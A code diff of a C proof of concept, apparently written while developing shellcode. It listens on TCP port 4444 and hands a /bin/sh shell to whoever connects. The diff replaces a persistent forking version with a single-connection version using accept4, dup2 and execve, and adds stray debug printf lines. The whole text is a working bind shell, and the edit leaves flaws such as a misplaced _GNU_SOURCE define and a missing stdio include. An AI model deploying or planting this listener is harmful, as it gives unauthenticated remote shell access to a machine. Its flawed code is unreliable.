@@ -1,10 +1,6 @@
 /*
- * tcp_bind_shellcode_poc.c: binds on a given TCP port and spawn a shell on *
- * incoming connections.
- *
- * Bonus features: 
- * 	+ bind shell doesn't die when all clients disconnect. 
- * 	+ it supports up to 5 incoming connections in parallel.
+ * tcp_bind_shellcode_light_poc.c: binds on a given TCP port and spawn a shell
+ * on incoming connections. 
  *
  * BSD 2-Clause License
  *
@@ -20,13 +16,14 @@
 
 // for socket(), bind(), accept() calls
 #include <sys/types.h>
+#define _GNU_SOURCE // for accept4
 #include <sys/socket.h>
 #include <netinet/in.h>
 
 #define DPORT	4444
 
 int main(int argc, char **argv) {
-	int sfd, cfd, p;
+	int sfd, cfd;
 	struct sockaddr_in my_addr;
 
 	sfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -39,19 +36,15 @@ int main(int argc, char **argv) {
 
 	bind(sfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
 
-	listen(sfd, 5);
+	listen(sfd, 0);
+	printf("%d\n", sizeof(struct sockaddr));
+	printf("%d\n", sizeof(socklen_t));
+	printf("%d\n", sizeof(int));
+	cfd = accept4(sfd, NULL, NULL, 0);
 
-	while (1) {
-		cfd = accept(sfd, NULL, NULL);
-
-		p = fork();
-
-		if ( p == 0 ) {
-			dup2(cfd, 0);
-			dup2(cfd, 1);
-			dup2(cfd, 2);
-			execve((const char *)"/bin/sh", NULL, NULL);
-		}
-	}
+	dup2(cfd, 0);
+	dup2(cfd, 1);
+	dup2(cfd, 2);
+	execve((const char *)"/bin/sh", NULL, NULL);
 	return 0;
 }
